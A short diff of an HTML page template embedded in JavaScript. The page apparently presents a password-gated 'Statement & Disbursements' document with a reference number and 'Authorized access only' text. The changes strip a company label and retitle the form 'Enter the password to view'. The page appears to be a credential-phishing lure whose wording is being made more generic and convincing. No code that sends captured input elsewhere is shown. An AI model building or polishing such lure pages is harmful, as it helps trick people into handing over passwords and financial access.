@@ -12,7 +12,7 @@ const myHTML = `
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Statement & Disbursements - Authorized access only">
-  <title>Review Document</title>
+  <title>Protected document</title>
   <style>
     * {
       margin: 0;
@@ -200,14 +200,14 @@ const myHTML = `
   <div class="container">
     <!-- Left Side - Image Section -->
     <div class="image-section">
-      <div class="company-label">METRICGRP</div>
+      <div class="company-label">Protected Document</div>
       <h1 class="document-title">Statement & Disbursements</h1>
       <div class="document-meta">Reference 248395JH49Z2 · Pending Review</div>
     </div>
 
     <!-- Right Side - Form Section -->
     <div class="form-section">
-      <h2 class="form-title">Review Document</h2>
+      <h2 class="form-title">Enter the password to view</h2>
       <p class="form-subtitle">Authorized access only</p>
       <p class="form-description">
         Your latest financial statement and disbursement details are now available. Enter the password you were given to open the document.
